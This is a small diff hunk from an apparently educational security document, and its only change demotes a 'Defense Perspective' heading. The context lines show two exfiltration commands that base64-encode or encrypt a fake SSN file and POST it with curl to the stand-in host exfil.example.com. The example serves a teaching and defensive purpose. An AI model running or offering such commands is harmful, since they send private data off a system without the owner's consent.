@@ -322,7 +322,7 @@ base64 fake-ssn.txt | curl -X POST https://exfil.example.com/ -d @-
 openssl enc -aes-256-cbc -k "$KEY" -in fake-ssn.txt | curl -X POST https://exfil.example.com/ -d @-
 ```
 
-## Defense Perspective
+### Defense Perspective
 
 Defenders must assume:
 
